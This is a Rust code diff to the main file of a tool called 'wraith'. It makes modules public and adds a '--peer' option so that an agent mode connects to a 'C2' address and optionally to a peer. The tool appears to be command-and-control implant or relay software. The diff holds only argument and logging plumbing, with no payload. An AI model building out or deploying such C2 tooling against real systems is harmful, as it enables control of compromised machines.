@@ -2,12 +2,12 @@
 extern crate log;
 extern crate simplelog;
 
-mod proto;
-mod connection;
-mod message;
-mod commands;
-mod relay;
-mod wraith;
+pub mod proto;
+pub mod connection;
+pub mod message;
+pub mod commands;
+pub mod relay;
+pub mod wraith;
 
 use clap::Parser;
 use log::{error, info};
@@ -50,9 +50,13 @@ struct Args {
     #[arg(long, value_name = "HOST:PORT")]
     agent_listen: Option<String>,
 
-    /// Agent mode: connect to peer wraith (format: HOST:PORT)
+    /// Agent mode: connect to C2 at HOST:PORT, and optionally connect to peer at --peer HOST:PORT
     #[arg(long, value_name = "HOST:PORT")]
     agent_connect: Option<String>,
+
+    /// Peer to connect to (for agent mode, format: HOST:PORT)
+    #[arg(long, value_name = "HOST:PORT")]
+    peer: Option<String>,
 }
 
 fn setup_logging(debug: bool, log_file: &Option<String>) -> Result<(), Box<dyn std::error::Error>> {
@@ -103,9 +107,13 @@ fn main() {
 
     if let Some(addr) = &args.agent_connect {
         let (host, port) = parse_host_port(addr);
-        info!("Agent mode: connecting to peer at {}:{}", host, port);
+        let peer_addr = args.peer.clone();
+        info!("Agent mode: connecting to C2 at {}:{}", host, port);
+        if let Some(ref peer) = peer_addr {
+            info!("Agent mode: connecting to peer at {}", peer);
+        }
         let rt = tokio::runtime::Runtime::new().unwrap();
-        let mut wraith = wraith::Wraith::new_agent_connect(host, port);
+        let mut wraith = wraith::Wraith::new_agent_connect(host, port, peer_addr);
         rt.block_on(wraith.run_agent_connect());
         return;
     }
